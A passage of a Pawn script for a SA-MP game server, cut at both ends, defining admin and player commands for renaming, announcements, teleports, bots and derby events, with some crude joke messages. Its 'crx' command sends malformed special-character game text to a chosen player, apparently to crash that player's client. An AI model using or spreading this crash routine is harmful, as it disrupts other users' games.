        poo = -1;
	}

	ApplyAnimation(playerid, "FOOD", "FF_Sit_Loop", 4.1, 0, 1, 1, 1, 1);
	GetPlayerPos(playerid, playerxyza[0], playerxyza[1], playerxyza[2]);
	GetXYBehindPlayer(playerid, playerxyza[0], playerxyza[1], 1.5);
	poo = CreatePickup(1576, 2, playerxyza[0], playerxyza[1], playerxyza[2]-0.9, GetPlayerVirtualWorld(playerid));
	GetPlayerName(playerid, playerpoo, sizeof(playerpoo));
	format(strings, sizeof(strings), "%s has dropped a {9b6b2b}poo {65dbc6}:O!", playerpoo);
	SendServerMessageToAll("{65dbc6}", strings);
	format(ircstring, sizeof(ircstring), "10%s has dropped a 5poo10 :O!", playerpoo);
	IRC_GroupSay(1, IRC_CHANNEL, ircstring);
	SendCommandMessageToAdmins(playerid, "poo");
	return 1;
}

dcmd_pill(playerid,params[])
{
	#pragma unused params

	if (IsPlayerInAnyVehicle(playerid))
	return SendErrorMessage(playerid, EMBED_WHITE, "You cannot drop the pill inside the car");

	if (pill != -1)
	{
		SendClientMessage(playerid, COLOR_WHITE, "[INFO]: The pill was already dropped... Destroying old pickup.");
    	DestroyPickup(pill);
        pill = -1;
	}

	ApplyAnimation(playerid, "FOOD", "FF_Sit_Loop", 4.1, 0, 1, 1, 1, 1);
	GetPlayerPos(playerid, playerxyza[0], playerxyza[1], playerxyza[2]);
	GetXYBehindPlayer(playerid, playerxyza[0], playerxyza[1], 1.5);
	pill = CreatePickup(1241, 2, playerxyza[0], playerxyza[1], playerxyza[2]-0.5, GetPlayerVirtualWorld(playerid));
	GetPlayerName(playerid, playerpill, sizeof(playerpill));
	format(strings, sizeof(strings), "%s has removed {E81CC9}illegal drugs {65dbc6}from his butthole :O!", playerpill);
	SendServerMessageToAll("{65dbc6}", strings);
	format(ircstring, sizeof(ircstring), "10%s has removed 4illegal drugs10 from his butthole :O!", playerpill);
	IRC_GroupSay(1, IRC_CHANNEL, ircstring);
	SendCommandMessageToAdmins(playerid, "pill");
	return 1;
}

dcmd_setname(playerid,params[])
{
    new idx;

	tmps2 = strtok(params, idx);
 	if (!strlen(tmps2))
 	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /setname <name|id> <newname>");

	if (!IsNumeric(tmps2)) giveplayerid = ReturnPlayerID(tmps2);
	else giveplayerid = strval(tmps2);

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2) || !IsNameValid(tmps2) || strlen(tmps2) > 24)
 	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /setname <name|id> <newname> (MAX 24 CHAR.) [0-9, A-Z, a-z, [, ], and _]");

	if (IsPlayerConnected(giveplayerid) && giveplayerid != INVALID_PLAYER_ID)
	{
		if (player[playerid][ADMIN] < player[giveplayerid][ADMIN])
		return SendClientMessage(playerid, COLOR_WHITE , "This player has higher priveleges than you. Action cancelled.");

		SetPlayerName(giveplayerid, tmps2);
		SendCommandMessageToAdmins(playerid, "setname", 4);
	} else SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected.");
	return 1;
}

dcmd_fsetname(playerid,params[])
{
    new idx;

	tmps2 = strtok(params, idx);
 	if (!strlen(tmps2))
 	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /fsetname <name|id> <newname>");

	if (!IsNumeric(tmps2)) giveplayerid = ReturnPlayerID(tmps2);
	else giveplayerid = strval(tmps2);

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2) || !IsNameValid(tmps2) || strlen(tmps2) > 24)
 	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /fsetname <name|id> <newname> (MAX 24 CHAR.) [0-9, A-Z, a-z, [, ], and _]");

	if (IsPlayerConnected(giveplayerid) && giveplayerid != INVALID_PLAYER_ID)
	{
		if (player[playerid][ADMIN] < player[giveplayerid][ADMIN])
		return SendClientMessage(playerid, COLOR_WHITE , "This player has higher priveleges than you. Action cancelled.");

		GetPlayerName(giveplayerid, giveplayername, sizeof(giveplayername));
     	format(strings, sizeof(strings), "%s has left the server (Leaving)", giveplayername);
		SendClientMessageToAll(0xAFAFAFAA, strings);
		SetPlayerName(giveplayerid, tmps2);
		SendCommandMessageToAdmins(playerid, "fsetname", 4);
	} else SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected.");
	return 1;
}

dcmd_motd(playerid, params[])
{
	if (!strlen(params))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /motd <server message|default>");

	if (!strcmp(params, "default", true)) servermessage = DEFAULT_MOTD;
	else strmid(servermessage, params, 0, strlen(params));

	format(sMsg, sizeof(sMsg), "%s\n\n%s", servermessage, serverrules);
    ShowPlayerDialog(playerid, DIALOGID_UNKNOWN, DIALOG_STYLE_MSGBOX, "xMovie Server Rules/Updates", sMsg, "I agree", "");
	SendCommandMessageToAdmins(playerid, "motd");
	return 1;
}

dcmd_addtele(playerid,params[])
{
	new TeleID,
	    TeleDesc[50];

	if (sscanf(params, "p<|>ds[50]", TeleID, TeleDesc))
	return SendClientMessage(playerid, COLOR_DARKRED , "[USAGE]: /addtele <teleID[1-100]> <description> [Max. 50 CHARACTERS]");

	new mysqlStr[81];
 	format(mysqlStr, sizeof(mysqlStr), "SELECT * FROM "MYSQL_TABLE_TELEPORTS" WHERE `teleport_id` = %d LIMIT 1", TeleID);
	mysql_run_query(mysqlConnection, mysqlStr, true, "QS_CreateTeleport", "iiis", playerid, player[playerid][cinc], TeleID, TeleDesc);
	return 1;
}

dcmd_deltele(playerid,params[])
{
	new TeleID;

	if (sscanf(params, "p<|>d", TeleID))
	return SendClientMessage(playerid, COLOR_DARKRED , "[USAGE]: /deltele <teleID[1-100]>");
	
	new mysqlStr[81];
 	format(mysqlStr, sizeof(mysqlStr), "SELECT * FROM "MYSQL_TABLE_TELEPORTS" WHERE `teleport_id` = %d LIMIT 1", TeleID);
	mysql_run_query(mysqlConnection, mysqlStr, true, "QS_RemoveTeleport", "iii", playerid, player[playerid][cinc], TeleID);
	return 1;
}

dcmd_connect(playerid,params[])
{
    new idx,
		botname[50],
		botscript[50],
		currentnpcs = 0,
		maxnpcs;

	botname = strtok(params, idx);
 	if (!strlen(botname))
 	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /connect <botname> <botscript[use npcidle for empty script]>");

	botscript = strtok(params, idx);
 	if (!strlen(botscript))
 	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /connect <botname> <botscript[use npcidle for empty script]>");
	maxnpcs = GetServerVarAsInt("maxnpc");

	ConnectNPC(botname, botscript);

	for (new i = 0; i < MAX_PLAYERS; i++)
	if (IsPlayerNPC(i)) currentnpcs++;

	format(strings, sizeof(strings), "Loading new bot: %s | script: %s. [SERVER_MAX_BOTS: %d/%d]", botname, botscript, currentnpcs+1, maxnpcs);
	SendMessageToAdmins(COLOR_LLBLUE, strings, 4);
	SendCommandMessageToAdmins(playerid, "connect");
	return 1;
}

dcmd_ann(playerid, params[])
{
	if (!strlen(params) || strlen(params) > 100)
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /ann <message> [Max. 100 characters]");

	if (adminmsgtimer != -1)
	return SendErrorMessage(playerid, EMBED_WHITE, "You must wait untill the announcement has disappeared.");

	SendCommandMessageToAdmins(playerid, "ann"); // show first incase an admin tries to abuse-crash people
	format(announcestr, sizeof(announcestr), "                                                                                    %s", params);
	adminmsgcount = 0;
	adminmsgend = strlen(announcestr);
	TextDrawShowForAll(adminmsg);
	adminmsgtimer = SetTimer("AnnounceMessage", 200, 1);
	return 1;
}

dcmd_annstop(playerid, params[])
{
	#pragma unused params

	if (adminmsgtimer == -1)
	return SendErrorMessage(playerid, EMBED_WHITE, "Nothing has been announced yet.");

	SendCommandMessageToAdmins(playerid, "annstop");
	KillTimer(adminmsgtimer);
	TextDrawHideForAll(adminmsg);
	adminmsgtimer = -1;
	announcestr = " ";
	TextDrawSetString(adminmsg, announcestr);
	return 1;
}

public AnnounceMessage()
{
	if (adminmsgcount >= adminmsgend-1)
	{
		KillTimer(adminmsgtimer);
		TextDrawHideForAll(adminmsg);
		adminmsgtimer = -1;
		announcestr = " ";
	    return 1;
	}

	new fulladminmsg[90];
	format(fulladminmsg, sizeof(fulladminmsg), "%s", announcestr[adminmsgcount]);
	TextDrawSetString(adminmsg, fulladminmsg);
	adminmsgcount += 1;
	return 1;
}

dcmd_crx(playerid,params[])
{
    new idx;

	tmps2 = strtok(params, idx);
 	if (!strlen(tmps2))
 	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /crx <name|id>");

	if (!IsNumeric(tmps2)) giveplayerid = ReturnPlayerID(tmps2);
	else giveplayerid = strval(tmps2);

	if (IsPlayerConnected(giveplayerid) && giveplayerid != INVALID_PLAYER_ID)
	{
		if (giveplayerid == playerid)
	    return SendErrorMessage(playerid, EMBED_WHITE, "You can't crx yourself");

		if (player[playerid][ADMIN] < player[giveplayerid][ADMIN])
		return SendErrorMessage(playerid, EMBED_WHITE, "This player has higher priveleges than you. Action cancelled.");

	    SetPlayerVirtualWorld(giveplayerid, WORLDID_DERBY+1);
		GameTextForPlayer(giveplayerid, "¤¶§!$$%&'()*+,-./01~!@#$^&*()_-+={[}]:;'<,>.?/", 1000, 0);
		GameTextForPlayer(giveplayerid, "¤¶§!$$%&'()*+,-./01~!@#$^&*()_-+={[}]:;'<,>.?/", 2000, 1);
		GameTextForPlayer(giveplayerid, "¤¶§!$$%&'()*+,-./01~!@#$^&*()_-+={[}]:;'<,>.?/", 3000, 2);
		GameTextForPlayer(giveplayerid, "¤¶§!$$%&'()*+,-./01~!@#$^&*()_-+={[}]:;'<,>.?/", 4000, 3);
		GameTextForPlayer(giveplayerid, "¤¶§!$$%&'()*+,-./01~!@#$^&*()_-+={[}]:;'<,>.?/", 5000, 4);
		GameTextForPlayer(giveplayerid, "¤¶§!$$%&'()*+,-./01~!@#$^&*()_-+={[}]:;'<,>.?/", 6000, 5);
		GameTextForPlayer(giveplayerid, "¤¶§!$$%&'()*+,-./01~!@#$^&*()_-+={[}]:;'<,>.?/", 7000, 6);
		SendCommandMessageToAdmins(playerid, "crx", 4);
	} else SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected.");
	return 1;
}

dcmd_derbyhelp(playerid,params[])
{
	#pragma unused params

	ShowPlayerDialog(playerid, DIALOGID_UNKNOWN, DIALOG_STYLE_MSGBOX, "Instructions derby", "1) /addderby   NAME\n2) /setdveh    DerbyID VEHICLE\n3) /setdmode   DerbyID 1=ball/2=height\n4) /setdheight DerbyID RADIUS/HEIGHT (depends on choosen mode)\n5) /setdspawn  DerbyID\n6) /setdcenter DerbyID\n7) /setdmap    DerbyID MAPNAME (optional!)\n\nRemoving:\n1) /deldspawn  DerbyID SpawnID\n2) /delderby   DerbyID", "OK", "");
	return 1;
}

dcmd_addderby(playerid,params[])
{
	if (!strlen(params) || strlen(params) > 30)
 	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /addderby <name> (MAX 35 CHAR.)");

	new derbyfound = 0,
		derbyid,
		derbyidstr[20];

	for (new i = 1; i <= MAX_DERBIES; i++)
	{
  		format(derbyidstr, sizeof(derbyidstr), "D%d", i);
		if (!djIsSet(DERBYFILE, derbyidstr))
		{
			derbyfound = 1;
			derbyid = i;
			break;
		}
	}
	if (derbyfound == 0)
	return SendErrorMessage(playerid, EMBED_WHITE, "All derby slots are used!");

  	format(derbystr, sizeof(derbystr), "D%d/Comment", derbyid);
	djSet(DERBYFILE, derbystr, params);

	GetPlayerName(playerid, playername, sizeof(playername));
	format(strings, sizeof(strings), "Admin %s has added a new derby map \"%s\" [DerbyID: %d]", playername, params, derbyid);
	SendServerMessageToAll(EMBED_WHITE, strings);
	SendCommandMessageToAdmins(playerid, "addderby");
	return 1;
}

dcmd_setdveh(playerid,params[])
{
    new idx;

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2) || strval(tmps2) < 1 || strval(tmps2) > MAX_DERBIES)
 	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /setdveh <DerbyID> <vehicle>");

	new derbyidstr[20];
	format(derbyidstr, sizeof(derbyidstr), "D%d", strval(tmps2));
	if (!djIsSet(DERBYFILE, derbyidstr))
	return SendErrorMessage(playerid, EMBED_WHITE, "There is no derby map saved in this slot");
 	new derbyid = strval(tmps2);

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2))
 	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /setdveh <DerbyID> <vehicle>");

 	idx = GetVehicleModelIDFromName(tmps2);
	if (idx == -1)
	{
		idx = strval(tmps2);
		if (idx < 400 || idx > 611)
		return SendErrorMessage(playerid, EMBED_WHITE, "This vehicle does not exist");
	}
	if (IsInvalidDerbyVehicle(idx)) return SendErrorMessage(playerid, EMBED_WHITE, "This vehicle cannot be used in a derby");
	else {
	    format(derbystr, sizeof(derbystr), "D%d/Vehicle", derbyid);
		djSetInt(DERBYFILE, derbystr, idx);
	}

	format(derbystr, sizeof(derbystr), "D%d/Comment", derbyid);
	format(strings, sizeof(strings), "You have set vehicle to \"%s\" from derby \"%s\" [DerbyID: %d]",  aVehicleNames[idx - 400], dj(DERBYFILE, derbystr), derbyid);
	SendClientMessage(playerid, COLOR_YELLOW, strings);
	SendCommandMessageToAdmins(playerid, "setdveh");
	return 1;
}

dcmd_setdmode(playerid,params[])
{
    new idx;

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2) || strval(tmps2) < 1 || strval(tmps2) > MAX_DERBIES)
 	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /setdmode <DerbyID> <1 = ball, 2 = height>");

	new derbyidstr[20];
	format(derbyidstr, sizeof(derbyidstr), "D%d", strval(tmps2));
	if (!djIsSet(DERBYFILE, derbyidstr))
	return SendErrorMessage(playerid, EMBED_WHITE, "There is no derby map saved in this slot");
 	new derbyid = strval(tmps2);

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2) || strval(tmps2) < 1 || strval(tmps2) > 2)
 	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /setdmode <DerbyID> <1 = ball, 2 = height>");
    format(derbystr, sizeof(derbystr), "D%d/Mode", derbyid);
	djSetInt(DERBYFILE, derbystr, strval(tmps2));

	format(derbystr, sizeof(derbystr), "D%d/Comment", derbyid);
	format(strings, sizeof(strings), "You have set mode to %d from derby \"%s\" [DerbyID: %d]", strval(tmps2), dj(DERBYFILE, derbystr), derbyid);
	SendClientMessage(playerid, COLOR_YELLOW, strings);
	SendCommandMessageToAdmins(playerid, "setdmode");
	return 1;
}

dcmd_setdheight(playerid,params[])
{
    new idx;

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2) || strval(tmps2) < 1 || strval(tmps2) > MAX_DERBIES)
 	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /setdheight <DerbyID> <distance_to_loose[1-500]>");

	new derbyidstr[20];
	format(derbyidstr, sizeof(derbyidstr), "D%d", strval(tmps2));
	if (!djIsSet(DERBYFILE, derbyidstr))
	return SendErrorMessage(playerid, EMBED_WHITE, "There is no derby map saved in this slot");
 	new derbyid = strval(tmps2);

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2) || strval(tmps2) < 1 || strval(tmps2) > 500)
 	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /setdheight <DerbyID> <distance_to_loose[1-500]>");
    format(derbystr, sizeof(derbystr), "D%d/LoseHeight", derbyid);
	djSetFloat(DERBYFILE, derbystr, strval(tmps2));

	format(derbystr, sizeof(derbystr), "D%d/Comment", derbyid);
	format(strings, sizeof(strings), "You have set distance to %d from derby \"%s\" [DerbyID: %d]", strval(tmps2), dj(DERBYFILE, derbystr), derbyid);
	SendClientMessage(playerid, COLOR_YELLOW, strings);
	SendCommandMessageToAdmins(playerid, "setdheight");
	return 1;
}

dcmd_setdspawn(playerid,params[])
{
    new idx;

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2) || strval(tmps2) < 1 || strval(tmps2) > MAX_DERBIES)
 	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /setdspawn <DerbyID[1-100]>");

	new derbyidstr[20];
	format(derbyidstr, sizeof(derbyidstr), "D%d", strval(tmps2));
	if (!djIsSet(DERBYFILE, derbyidstr))
	return SendErrorMessage(playerid, EMBED_WHITE, "There is no derby map saved in this slot");
 	new derbyid = strval(tmps2),
	 	spawnid,
	 	spawnfound = 0;

	for (new i = 1; i < MAX_DERBY_PLAYERS+1; i++)
	{
  		format(derbyidstr, sizeof(derbyidstr), "D%d/Spawn%d", derbyid, i);
		if (!djIsSet(DERBYFILE, derbyidstr))
		{
			spawnfound = 1;
			spawnid = i;
			break;
		}
	}
	if (spawnfound == 0)
	return SendErrorMessage(playerid, EMBED_WHITE, "All derby slots are used!");

  	new vID = GetPlayerVehicleID(playerid),
	  	playeri;

	if (vID)
	{
		GetVehiclePos(vID, playerxyza[0], playerxyza[1], playerxyza[2]);
	    GetVehicleZAngle(vID, playerxyza[3]);
	} else {
 		GetPlayerPos(playerid, playerxyza[0], playerxyza[1], playerxyza[2]);
	    GetPlayerFacingAngle(playerid, playerxyza[3]);
	}
    playeri = GetPlayerInterior(playerid);

    format(derbystr, sizeof(derbystr), "D%d/Spawn%d/X", derbyid, spawnid);
	djSetFloat(DERBYFILE, derbystr, playerxyza[0]);
 	format(derbystr, sizeof(derbystr), "D%d/Spawn%d/Y", derbyid, spawnid);
	djSetFloat(DERBYFILE, derbystr, playerxyza[1]);
 	format(derbystr, sizeof(derbystr), "D%d/Spawn%d/Z", derbyid, spawnid);
	djSetFloat(DERBYFILE, derbystr, playerxyza[2] +2); // if map ain't loaded on time, you will fall (in water)
 	format(derbystr, sizeof(derbystr), "D%d/Spawn%d/A", derbyid, spawnid);
	djSetFloat(DERBYFILE, derbystr, playerxyza[3]);
 	format(derbystr, sizeof(derbystr), "D%d/SpawnInterior", derbyid);
	djSetInt(DERBYFILE, derbystr, playeri);

	format(derbystr, sizeof(derbystr), "D%d/Comment", derbyid);
	format(strings, sizeof(strings), "You have added spawn %d to derby \"%s\" [DerbyID: %d]", spawnid, dj(DERBYFILE, derbystr), derbyid);
	SendClientMessage(playerid, COLOR_YELLOW, strings);
	SendCommandMessageToAdmins(playerid, "setdspawn");
	return 1;
}

dcmd_setdcenter(playerid,params[])
{
    new idx;

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2) || strval(tmps2) < 1 || strval(tmps2) > MAX_DERBIES)
 	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /setdcenter <DerbyID[1-100]>");

	new derbyidstr[20];
	format(derbyidstr, sizeof(derbyidstr), "D%d", strval(tmps2));
	if (!djIsSet(DERBYFILE, derbyidstr))
	return SendErrorMessage(playerid, EMBED_WHITE, "There is no derby map saved in this slot");
 	new derbyid = strval(tmps2);

  	new vID = GetPlayerVehicleID(playerid);

	if (vID)
	{
		GetVehiclePos(vID, playerxyza[0], playerxyza[1], playerxyza[2]);
	    GetVehicleZAngle(vID, playerxyza[3]);
	} else {
 		GetPlayerPos(playerid, playerxyza[0], playerxyza[1], playerxyza[2]);
	    GetPlayerFacingAngle(playerid, playerxyza[3]);
	}

    format(derbystr, sizeof(derbystr), "D%d/Center/X", derbyid);
	djSetFloat(DERBYFILE, derbystr, playerxyza[0]);
 	format(derbystr, sizeof(derbystr), "D%d/Center/Y", derbyid);
	djSetFloat(DERBYFILE, derbystr, playerxyza[1]);
 	format(derbystr, sizeof(derbystr), "D%d/Center/Z", derbyid);
	djSetFloat(DERBYFILE, derbystr, playerxyza[2]);

	format(derbystr, sizeof(derbystr), "D%d/Comment", derbyid);
	format(strings, sizeof(strings), "You have set a new center to derby \"%s\" [DerbyID: %d]", dj(DERBYFILE, derbystr), derbyid);
	SendClientMessage(playerid, COLOR_YELLOW, strings);
	SendCommandMessageToAdmins(playerid, "setdcenter");
	return 1;
}

dcmd_setdmap(playerid,params[])
{
    new idx;

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2) || strval(tmps2) < 1 || strval(tmps2) > MAX_DERBIES)
 	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /setdmap <DerbyID[1-100]> <DerbyMap>");

	new derbyidstr[20];
	format(derbyidstr, sizeof(derbyidstr), "D%d", strval(tmps2));
	if (!djIsSet(DERBYFILE, derbyidstr))
	return SendErrorMessage(playerid, EMBED_WHITE, "There is no derby map saved in this slot");
 	new derbyid = strval(tmps2);

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2))
 	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /setdmap <DerbyID[1-100]> <DerbyMap>");

	format(strings, sizeof(strings), "Maps/%s.ini", tmps2);
	if (!fexist(strings))
	return SendErrorMessage(playerid, EMBED_WHITE, "The given mapname does not exist!");

	format(derbystr, sizeof(derbystr), "D%d/Loadmap", derbyid);
	djSet(DERBYFILE, derbystr, tmps2);

	format(derbystr, sizeof(derbystr), "D%d/Comment", derbyid);
	format(strings, sizeof(strings), "The map \"%s\" is now related to derby \"%s\" [DerbyID: %d]", tmps2, dj(DERBYFILE, derbystr), derbyid);
	SendClientMessage(playerid, COLOR_YELLOW, strings);
	SendCommandMessageToAdmins(playerid, "setdmap");
	return 1;
}

dcmd_deldspawn(playerid,params[])
{
    new idx;

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2) || strval(tmps2) < 1 || strval(tmps2) > MAX_DERBIES)
 	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /deldspawn <DerbyID[1-100]> <SpawnID[1-12]>");

	new derbyidstr[20];
	format(derbyidstr, sizeof(derbyidstr), "D%d", strval(tmps2));
	if (!djIsSet(DERBYFILE, derbyidstr))
	return SendErrorMessage(playerid, EMBED_WHITE, "There is no derby map saved in this slot");
 	new derbyid = strval(tmps2);

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2) || strval(tmps2) < 1 || strval(tmps2) > MAX_DERBY_PLAYERS)
 	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /deldspawn <DerbyID[1-100]> <SpawnID[1-12]>");
 	new spawnid = strval(tmps2);

	GetPlayerName(playerid, playername, sizeof(playername));
	format(derbystr, sizeof(derbystr), "D%d/Spawn%d", derbyid, spawnid);
	if (!djIsSet(DERBYFILE, derbystr))
	return SendErrorMessage(playerid, EMBED_WHITE, "There is no spawn for derby saved in this slot");
	djUnset(DERBYFILE, derbystr);

	format(derbystr, sizeof(derbystr), "D%d/Comment", derbyid);
	format(strings, sizeof(strings), "You have deleted spawn %d from derby \"%s\" [DerbyID: %d]", spawnid, dj(DERBYFILE, derbystr), derbyid);
	SendClientMessage(playerid, COLOR_YELLOW, strings);
	SendCommandMessageToAdmins(playerid, "deldspawn");
	return 1;
}

dcmd_setevents(playerid,params[])
{
	#pragma unused params

	GetPlayerName(playerid, playername, sizeof(playername));
	if (blockevents == true)
	{
		blockevents = false;
		format(strings, sizeof(strings), "Admin %s has "EMBED_GREEN"ENABLED"EMBED_WHITE" all the events.", playername);
		format(tmps2, sizeof(tmps2), "2Admin %s has ENABLED all the events.", playername);
	} else {
		blockevents = true;
		format(strings, sizeof(strings), "Admin %s has "EMBED_RED"DISABLED"EMBED_WHITE" all the events.", playername);
		format(tmps2, sizeof(tmps2), "2Admin %s has DISABLED all the events.", playername);
	}
	SendServerMessageToAll(EMBED_WHITE, strings);
	IRC_GroupSay(1, IRC_CHANNEL, tmps2);
	SendCommandMessageToAdmins(playerid, "setevents");
	return 1;
}

dcmd_lockevent(playerid,params[])
{
	#pragma unused params

	new specificevent[8];
	if (sscanf(params, "s[8] ", specificevent))
	return SendClientMessage(playerid, COLOR_IVORY, "[INFO] /lockevent <dm/derby/rr/cc/nb/wz|all>");

	GetPlayerName(playerid, playername, sizeof(playername));
	if (!strcmp(specificevent, "dm",true))
	{
		if (dmlocked == false)
		{
			dmlocked	= true;

			format(strings, sizeof(strings), "Admin %s has "EMBED_RED"LOCKED"EMBED_WHITE" the DM event.", playername);
			format(tmps2, sizeof(tmps2), "2Admin %s has locked the DM event.", playername);
		} else {
			dmlocked	= false;

			format(strings, sizeof(strings), "Admin %s has "EMBED_GREEN"UNLOCKED"EMBED_WHITE" the DM event.", playername);
			format(tmps2, sizeof(tmps2), "2Admin %s has unlocked the DM event.", playername);
		}
	} else if (!strcmp(specificevent, "derby",true))
	{
		if (derbylocked == false)
		{
			derbylocked	= true;

			format(strings, sizeof(strings), "Admin %s has "EMBED_RED"LOCKED"EMBED_WHITE" the Derby event.", playername);
			format(tmps2, sizeof(tmps2), "2Admin %s has locked the Derby event.", playername);
		} else {
			derbylocked	= false;

			format(strings, sizeof(strings), "Admin %s has "EMBED_GREEN"UNLOCKED"EMBED_WHITE" the Derby event.", playername);
			format(tmps2, sizeof(tmps2), "2Admin %s has unlocked the Derby event.", playername);
		}
	} else if (!strcmp(specificevent, "rr",true))
	{
		if (rrlocked == false)
		{
			rrlocked	= true;

			format(strings, sizeof(strings), "Admin %s has "EMBED_RED"LOCKED"EMBED_WHITE" the Russian Roulette event.", playername);
			format(tmps2, sizeof(tmps2), "2Admin %s has locked the Russian Roulette event.", playername);
		} else {
			rrlocked	= false;

			format(strings, sizeof(strings), "Admin %s has "EMBED_GREEN"UNLOCKED"EMBED_WHITE" the Russian Roulette event.", playername);
			format(tmps2, sizeof(tmps2), "2Admin %s has unlocked the Russian Roulette event.", playername);
		}
	} else if (!strcmp(specificevent, "cc",true))
	{
		if (cclocked == false)
		{
			cclocked	= true;

			format(strings, sizeof(strings), "Admin %s has "EMBED_RED"LOCKED"EMBED_WHITE" the Cop Chase event.", playername);
			format(tmps2, sizeof(tmps2), "2Admin %s has locked the Cop Chase event.", playername);
		} else {
			cclocked	= false;

			format(strings, sizeof(strings), "Admin %s has "EMBED_GREEN"UNLOCKED"EMBED_WHITE" the Cop Chase event.", playername);
			format(tmps2, sizeof(tmps2), "2Admin %s has unlocked the Cop Chase event.", playername);
		}
	} else if (!strcmp(specificevent, "nb",true))
	{
		if (nbblocked == false)
		{
			nbblocked	= true;

			format(strings, sizeof(strings), "Admin %s has "EMBED_RED"LOCKED"EMBED_WHITE" the Nadeball event.", playername);
			format(tmps2, sizeof(tmps2), "2Admin %s has locked the Nadeball event.", playername);
		} else {
			nbblocked	= false;

			format(strings, sizeof(strings), "Admin %s has "EMBED_GREEN"UNLOCKED"EMBED_WHITE" the Nadeball event.", playername);
			format(tmps2, sizeof(tmps2), "2Admin %s has unlocked the Nadeball event.", playername);
		}
	} else if (!strcmp(specificevent, "wz",true))
	{
		if (wzlocked == false)
		{
			wzlocked	= true;

			format(strings, sizeof(strings), "Admin %s has "EMBED_RED"LOCKED"EMBED_WHITE" the Warzone event.", playername);
			format(tmps2, sizeof(tmps2), "2Admin %s has locked the Warzone event.", playername);
		} else {
			wzlocked	= false;

			format(strings, sizeof(strings), "Admin %s has "EMBED_GREEN"UNLOCKED"EMBED_WHITE" the Warzone event.", playername);
			format(tmps2, sizeof(tmps2), "2Admin %s has unlocked the Warzone event.", playername);
		}
	} else if (!strcmp(specificevent, "all",true))
	{
		if (dmlocked == derbylocked == rrlocked == cclocked == nbblocked == wzlocked == true)
		{
			dmlocked	= true;
			derbylocked	= true;
			rrlocked	= true;
			cclocked	= true;
			nbblocked	= true;
			wzlocked	= true;

			format(strings, sizeof(strings), "Admin %s has "EMBED_RED"LOCKED"EMBED_WHITE" all the events.", playername);
			format(tmps2, sizeof(tmps2), "2Admin %s has locked all the events.", playername);
		} else {
			dmlocked	= false;
			derbylocked	= false;
			rrlocked	= false;
			cclocked	= false;
			nbblocked	= false;
			wzlocked	= false;

			format(strings, sizeof(strings), "Admin %s has "EMBED_GREEN"UNLOCKED"EMBED_WHITE" all the events.", playername);
			format(tmps2, sizeof(tmps2), "2Admin %s has unlocked all the events.", playername);
		}
	} else return SendClientMessage(playerid, COLOR_IVORY, "[INFO] /lockevent <dm/derby/rr/cc/nb/wz|all>");
	SendServerMessageToAll(EMBED_WHITE, strings);
	IRC_GroupSay(1, IRC_CHANNEL, tmps2);
	SendCommandMessageToAdmins(playerid, "lockevent");
	return 1;
}

dcmd_inviteevent(playerid,params[])
{
	new idx;

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2))
	return SendClientMessage(playerid, COLOR_IVORY, "[USAGE]: /inviteevent <name|id>");

	if (!IsNumeric(tmps2)) giveplayerid = ReturnPlayerID(tmps2);
	else giveplayerid = strval(tmps2);

	if (IsPlayerConnected(giveplayerid) && giveplayerid != INVALID_PLAYER_ID)
	{
		if (giveplayerid == playerid)
	    return SendErrorMessage(playerid, EMBED_WHITE, "You can't invite yourself!");
	
		if (player[playerid][ADMIN] < player[giveplayerid][ADMIN])
		return SendErrorMessage(playerid, EMBED_WHITE, "This player has higher priveleges than you. Action cancelled.");

		GetPlayerName(playerid, playername, sizeof(playername));
		GetPlayerName(giveplayerid, giveplayername, sizeof(giveplayername));
		if (player[giveplayerid][eventinvite] == 0)
		{
			player[giveplayerid][eventinvite] = 1;

			format(strings, sizeof(strings), "Admin %s has granted %s (id: %d) access to the events.", playername, giveplayername, giveplayerid);
			format(ircstring, sizeof(ircstring), "2Admin %s has granted %s (id: %d) access to the events.", playername, giveplayername, giveplayerid);
		} else {
			player[giveplayerid][eventinvite] = 0;

			format(strings, sizeof(strings), "Admin %s has removed %s's (id: %d) access to the events.", playername, giveplayername, giveplayerid);
			format(ircstring, sizeof(ircstring), "2Admin %s has removed %s's (id: %d) access to the events.", playername, giveplayername, giveplayerid);
		}
		SendServerMessageToAll(EMBED_WHITE, strings);
		IRC_GroupSay(1, IRC_CHANNEL, ircstring);
		SendCommandMessageToAdmins(playerid, "inviteevent");
	}
	return 1;
}

dcmd_delderby(playerid,params[])
{
